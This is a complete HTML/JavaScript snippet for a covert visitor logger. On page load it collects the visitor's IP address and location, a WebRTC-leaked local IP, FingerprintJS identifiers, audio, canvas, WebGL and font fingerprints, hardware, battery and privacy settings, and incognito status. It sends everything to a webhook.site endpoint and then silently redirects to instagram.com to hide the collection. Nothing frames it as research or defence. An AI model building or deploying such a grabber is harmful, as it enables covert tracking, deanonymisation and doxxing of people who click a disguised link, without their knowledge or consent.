<!-- FingerprintJS Library -->
<script src="https://fpjscdn.net/v3"></script>

<script>
    // --- CONFIGURATION ---
    // IMPORTANT: Replace with your actual Webhook.site URL
    const WEBHOOK_URL = "https://webhook.site/23943f87-8dd1-44e5-bb1a-d21c49296805";
    const FINGERPRINT_PUBLIC_KEY = "OZ32MdWEuPUfwlPD5MvN";
    const FINAL_REDIRECT_URL = "https://www.instagram.com";

    // --- DO NOT EDIT BELOW THIS LINE ---

    async function getAdvancedFingerprint() {
        const fp = await FingerprintJS.load({ apiKey: FINGERPRINT_PUBLIC_KEY });
        const result = await fp.get({ extendedResult: true });
        return result;
    }

    async function getWebRTCIP() {
        return new Promise((resolve) => {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (event) => {
                if (event && event.candidate && event.candidate.candidate) {
                    const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (ipMatch) {
                        resolve(ipMatch[0]);
                        rtc.close();
                    }
                }
            };
            setTimeout(() => { resolve(null); rtc.close(); }, 2000);
        });
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return { level: battery.level, charging: battery.charging };
        }
        return null;
    }

    async function getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            oscillator.type = 'triangle'; oscillator.frequency.value = 10000; gainNode.gain.value = 0;
            oscillator.connect(analyser); analyser.connect(scriptProcessor); scriptProcessor.connect(gainNode); gainNode.connect(audioContext.destination);
            oscillator.start();
            return new Promise(resolve => {
                scriptProcessor.onaudioprocess = (event) => {
                    const fingerprint = event.inputBuffer.getChannelData(0).slice(0, 50).join('');
                    oscillator.stop(); audioContext.close(); resolve(fingerprint);
                };
            });
        } catch (e) { return "AudioContext not supported"; }
    }

    function getPrivacySettings() {
        return {
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            plugins: Array.from(navigator.plugins).map(p => p.name).slice(0, 10),
            javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
        };
    }

    async function logAndRedirect() {
        console.log("ðŸš€ [LOGGER] Starting logging process...");

        try {
            console.log("ðŸ” [LOGGER] Gathering all data...");
            const [ipData, fpResult, webrtcIP, battery, audioFingerprint, privacySettings] = await Promise.allSettled([
                fetch('https://ipapi.co/json/').then(r => r.json()),
                getAdvancedFingerprint(),
                getWebRTCIP(),
                getBatteryInfo(),
                getAudioFingerprint(),
                Promise.resolve(getPrivacySettings())
            ]);
            console.log("âœ… [LOGGER] Data gathering complete.");

            const payload = {
                timestamp: new Date().toISOString(),
                ip: ipData.value?.ip,
                city: ipData.value?.city,
                region: ipData.value?.region,
                country: ipData.value?.country_name,
                isp: ipData.value?.org,
                fingerprintId: fpResult.value?.visitorId,
                confidence: fpResult.value?.confidence.score,
                browser: fpResult.value?.browserName,
                browserVersion: fpResult.value?.browserVersion,
                os: fpResult.value?.os,
                osVersion: fpResult.value?.osVersion,
                device: fpResult.value?.device,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                deviceMemory: navigator.deviceMemory || 'N/A',
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                gpu: fpResult.value?.graphicsCard?.renderer,
                gpuVendor: fpResult.value?.graphicsCard?.vendor,
                audioFingerprint: audioFingerprint.value,
                canvasFingerprint: fpResult.value?.canvasHash,
                webglFingerprint: fpResult.value?.webGlHash,
                fontFingerprint: fpResult.value?.fontHash,
                webrtcIP: webrtcIP.value,
                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'N/A',
                downlink: (navigator.connection && navigator.connection.downlink) ? navigator.connection.downlink : 'N/A',
                rtt: (navigator.connection && navigator.connection.rtt) ? navigator.connection.rtt : 'N/A',
                batteryLevel: battery.value?.level,
                batteryCharging: battery.value?.charging,
                privacy: privacySettings.value,
                incognito: fpResult.value?.incognito,
            };

            console.log("ðŸ“¤ [LOGGER] Sending payload to Webhook.site...");
            // Use navigator.sendBeacon for a more reliable fire-and-forget request
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
            console.log("âœ… [LOGGER] Data sent.");


        } catch (error) {
            console.error("ðŸ’¥ [LOGGER] A critical error occurred during logging:", error);
        } finally {
            console.log("ðŸ”— [LOGGER] Redirecting to final URL...");
            window.location.href = FINAL_REDIRECT_URL;
        }
    }

    // Start the logging process as soon as the page loads
    window.addEventListener('load', logAndRedirect);
</script>
